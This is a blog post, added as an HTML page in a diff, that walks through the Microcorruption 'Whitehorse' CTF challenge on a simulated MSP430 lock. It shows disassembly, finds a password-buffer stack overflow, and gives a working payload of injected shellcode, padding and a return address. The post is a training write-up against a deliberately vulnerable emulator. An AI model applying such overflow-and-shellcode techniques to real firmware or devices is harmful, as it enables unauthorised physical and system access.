@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  
+  <script type="application/ld+json">
+{
+    "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https://leonjza.github.io"
+    },
+    "articleSection" : "post",
+    "name" : "microcorruption - whitehorse",
+    "headline" : "microcorruption - whitehorse",
+    "description" : "<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png" />
+    
+    
+</figure>
+
+
+<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/06/microcorruption---reykjavik/">previous challenge</a> called <em>Reykjavik</em>. This challenge is titled <em>Whitehorse</em>.</p>
+
+<p>This challenge has the following description towards the bottom:</p>
+
+<blockquote>
+<p>This is Software Revision 01. The firmware has been updated to connect with the new hardware security module. We have removed the function to unlock the door from the LockIT Pro firmware.</p>
+</blockquote>
+
+<p>Not a lot of information to go on. Lets dig into the code to learn more.
+</p>",
+    "inLanguage" : "en-US",
+    "author" : "Leon Jacobs",
+    "creator" : "Leon Jacobs",
+    "publisher": "Leon Jacobs",
+    "accountablePerson" : "Leon Jacobs",
+    "copyrightHolder" : "Leon Jacobs",
+    "copyrightYear" : "2018",
+    "datePublished": "2018-03-07 16:11:34 &#43;0200 SAST",
+    "dateModified" : "2018-03-07 16:11:34 &#43;0200 SAST",
+    "url" : "https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/",
+    "wordCount" : "963",
+    "keywords" : [ "ctf","exploit","assembly","microcorruption","whitehorse","Blog" ]
+}
+</script>
+
+
+  <title>microcorruption - whitehorse &middot; </title>
+
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="https://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-44457032-2', 'auto');
+    ga('send', 'pageview');
+  </script>
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Blog</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/post">Posts</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About Me</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2018 <a href="https://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1 class="post-title">microcorruption - whitehorse</h1>
+    <span class="post-date">Mar 7, 2018 &middot; 5 minute read &middot; <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="https://leonjza.github.io/categories/ctf">ctf</a><a class="label" href="https://leonjza.github.io/categories/exploit">exploit</a><a class="label" href="https://leonjza.github.io/categories/assembly">assembly</a><a class="label" href="https://leonjza.github.io/categories/microcorruption">microcorruption</a><a class="label" href="https://leonjza.github.io/categories/whitehorse">whitehorse</a>
+    </span>
+    <figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png" />
+    
+    
+</figure>
+
+
+<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/06/microcorruption---reykjavik/">previous challenge</a> called <em>Reykjavik</em>. This challenge is titled <em>Whitehorse</em>.</p>
+
+<p>This challenge has the following description towards the bottom:</p>
+
+<blockquote>
+<p>This is Software Revision 01. The firmware has been updated to connect with the new hardware security module. We have removed the function to unlock the door from the LockIT Pro firmware.</p>
+</blockquote>
+
+<p>Not a lot of information to go on. Lets dig into the code to learn more.
+</p>
+
+<h2 id="whitehorse">whitehorse</h2>
+
+<p>For whitehorse, the <code>main</code> routine had a familiar setup where it simply called <code>login</code>.</p>
+
+<pre><code class="language-asm">4438 &lt;main&gt;
+4438:  b012 f444      call  #0x44f4 &lt;login&gt;
+</code></pre>
+
+<p>The <code>login</code> routine in turn did not have any particularly interesting logic in it either other than a call to <code>conditional_unlock_door</code> at <code>0x4514</code>. This routine seems to just get a password via a syscall, run <code>conditional_unlock_door</code> and print a message of <em>&ldquo;Access granted.&rdquo;</em> or <em>&ldquo;That password is not correct.&rdquo;</em> depending on the result of the <code>tst r15</code> call.</p>
+
+<pre><code class="language-asm">44f4 &lt;login&gt;
+44f4:  3150 f0ff      add   #0xfff0, sp
+44f8:  3f40 7044      mov   #0x4470 &quot;Enter the password to continue.&quot;, r15
+44fc:  b012 9645      call  #0x4596 &lt;puts&gt;
+4500:  3f40 9044      mov   #0x4490 &quot;Remember: passwords are between 8 and 16 characters.&quot;, r15
+4504:  b012 9645      call  #0x4596 &lt;puts&gt;
+4508:  3e40 3000      mov   #0x30, r14
+450c:  0f41           mov   sp, r15
+450e:  b012 8645      call  #0x4586 &lt;getsn&gt;
+4512:  0f41           mov   sp, r15
+4514:  b012 4644      call  #0x4446 &lt;conditional_unlock_door&gt;
+4518:  0f93           tst   r15
+
+; notice that there does not seem to be any logic to unlock here?
+451a:  0324           jz    #0x4522 &lt;login+0x2e&gt;
+451c:  3f40 c544      mov   #0x44c5 &quot;Access granted.&quot;, r15
+4520:  023c           jmp   #0x4526 &lt;login+0x32&gt;
+4522:  3f40 d544      mov   #0x44d5 &quot;That password is not correct.&quot;, r15
+4526:  b012 9645      call  #0x4596 &lt;puts&gt;
+452a:  3150 1000      add   #0x10, sp
+452e:  3041           ret
+</code></pre>
+
+<p>Weird, no syscall to unlock the lock? Lets see what <code>conditional_unlock_door</code> does:</p>
+
+<pre><code class="language-asm">4446 &lt;conditional_unlock_door&gt;
+4446:  0412           push  r4
+4448:  0441           mov   sp, r4
+444a:  2453           incd  r4
+444c:  2183           decd  sp
+444e:  c443 fcff      mov.b #0x0, -0x4(r4)
+4452:  3e40 fcff      mov   #0xfffc, r14
+4456:  0e54           add   r4, r14
+4458:  0e12           push  r14
+445a:  0f12           push  r15
+445c:  3012 7e00      push  #0x7e
+4460:  b012 3245      call  #0x4532 &lt;INT&gt;
+4464:  5f44 fcff      mov.b -0x4(r4), r15
+4468:  8f11           sxt   r15
+446a:  3152           add   #0x8, sp
+446c:  3441           pop   r4
+446e:  3041           ret
+</code></pre>
+
+<p>Errr, also pretty boring. This routine eventually does syscall <code>0x7e</code> though. In the <a href="https://microcorruption.com/manual.pdf">lock&rsquo;s manual</a>, <code>0x7e</code> is described as:</p>
+
+<blockquote>
+<p>Interface with the HSM-2. Trigger the deadbolt unlock if the password is correct.</p>
+</blockquote>
+
+<p>So it seems like this syscall might be the only logic we have to unlock the lock. Problem is though, the &ldquo;HSM&rdquo; is confirming the password validation here.</p>
+
+<p>Digging a bit further, I decided to enter a password that was again larger than the suggested <em>&ldquo;8 to 16 characters&rdquo;</em>.</p>
+
+
+<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/whitehorse_stack_overflow.png" />
+    
+    
+</figure>
+
+
+<p>Well looksy there! A stack overflow from the password field as the stack pointer (<code>sp</code>) points to <code>0x36ca</code> when the login function wants to return, meaning we can redirect the flow of code execution as we wish! There is just one problem here. We don&rsquo;t have any useful code we can jump to. The instruction at <code>0x445c</code> uses sycall <code>0x7e</code>, which asks the HSM to confirm the password.</p>
+
+<p>So what can we do? Well, we control a number of bytes in the password buffer, what if we jump to our own opcodes (shellcode)? :)</p>
+
+<p>To write the correct instructions needed to open the lock, we need to have read the <a href="https://microcorruption.com/manual.pdf">locks manual</a> and know that doing a syscall with interrupt number <code>0x7f</code> will open the lock (without some fancy pants HSM trying to verify anything). If you were paying attention in the previous challenges you may have also noticed that <code>0xf7</code> was used to unlock the lock there.</p>
+
+<p>From the locks manual and some of the challenges we have done up until now, we know that we need to simply push the interrupt number onto the stack that we want to call. This challenge already contains the opcodes we need for that too in the <code>conditional_unlock_door</code> routine, so its really easy to just copy/paste and modify those to suit our needs.</p>
+
+<pre><code class="language-asm">445c:  3012 7e00      push  #0x7e
+4460:  b012 3245      call  #0x4532 &lt;INT&gt;
+</code></pre>
+
+<p>For reference, you can use the <a href="https://onlinedisassembler.com/odaweb/">online disassembler</a> again, pasting the 8 raw bytes and reading the disassembly as you modify them to make sure you are on the right track. In reality, all we want to do really is swap the <code>0x7e</code> for an <code>0x7f</code>.</p>
+
+
+<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/whitehorse_shellcode.png" />
+    
+    
+</figure>
+
+
+<p>Our final opcodes for our custom shellcode would be:</p>
+
+<pre><code class="language-asm">3012 7f00
+b012 3245
+</code></pre>
+
+<p>Easy! That means the shellcode to unlock the lock will be <code>30127f00b0123245</code> within the password we provide. The size of our shellcode is exactly 8 bytes, meaning it fits comfortably within the password buffer, right before we corrupt the stack. That solves the shellcode we want to use, but how do we <strong>get</strong> there? That is actually really easy. :)</p>
+
+
+<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/whitehorse_password_buffer_start.png" />
+    
+    
+</figure>
+
+
+<p>While debugging the program, you will see that the password buffer always starts at <code>0x36ba</code>. We can also see that bytes 17 and 18 corrupt the stack causing that <code>ret</code> instruction to jump to an address we control, so all we should be doing is pad the password input with enough bytes so that position 17 and 18 can slide in <code>0x36ba</code> as the final 2 bytes of our payload.</p>
+
+<pre><code class="language-python">$ python
+&gt;&gt;&gt; shellcode = &quot;30127f00b0123245&quot;
+&gt;&gt;&gt; pad_char = &quot;41&quot;
+&gt;&gt;&gt; ret = &quot;ba36&quot;
+&gt;&gt;&gt;
+&gt;&gt;&gt; print(shellcode + (pad_char * 8) + ret)
+30127f00b01232454141414141414141ba36
+</code></pre>
+
+
+<figure>
+    
+        <img src="https://leonjza.github.io/images/microcorruption/whitehorse_unlock_win.png" />
+    
+    
+</figure>
+
+
+<p>With our final payload which includes custom shellcode to unlock the lock, we can see the <code>ret</code> causes a <code>jmp</code> to <code>0x36ba</code>, where syscall <code>0x7f</code> is prepared and called.</p>
+
+<h2 id="solution">solution</h2>
+
+<p>Enter <code>30127f00b01232454141414141414141ba36</code> as hex encoded input.</p>
+
+<h2 id="other-challenges">other challenges</h2>
+
+<p>For my other write ups in the microcorruption series, checkout <a href="https://leonjza.github.io/categories/microcorruption/">this</a> link.</p>
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
+
